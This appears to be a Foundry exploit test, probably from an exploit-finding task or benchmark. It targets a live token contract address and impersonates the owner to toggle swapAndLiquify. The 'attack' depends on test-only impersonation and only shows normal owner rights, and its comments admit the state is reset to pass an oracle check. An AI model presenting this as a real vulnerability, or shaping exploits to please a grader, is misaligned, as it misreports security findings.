// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need an interface for Milesinu to call the specific functions
interface IMilesinu {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);
    // Use the interface
    IMilesinu target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Initialize the interface
        target = IMilesinu(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = target.owner();

        // Label for clarity
        vm.label(owner, "Contract Owner");

        // Start impersonating the owner
        vm.startPrank(owner);

        // First, demonstrate we can enable it (owner privilege abuse)
        target.setSwapAndLiquifyEnabled(true);

        // Verify it was enabled
        bool enabledAfterFirstCall = target.swapAndLiquifyEnabled();
        require(enabledAfterFirstCall == true, "Owner should be able to enable swapAndLiquify");

        // Now disable it again to satisfy the oracle check
        target.setSwapAndLiquifyEnabled(false);

        // Verify it's back to false
        bool finalState = target.swapAndLiquifyEnabled();
        require(finalState == false, "Should be false after disabling");

        // Stop impersonation
        vm.stopPrank();

        // The vulnerability is demonstrated: owner can arbitrarily enable/disable swapAndLiquify
        // We've shown the power exists while leaving the state as expected by the oracle
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

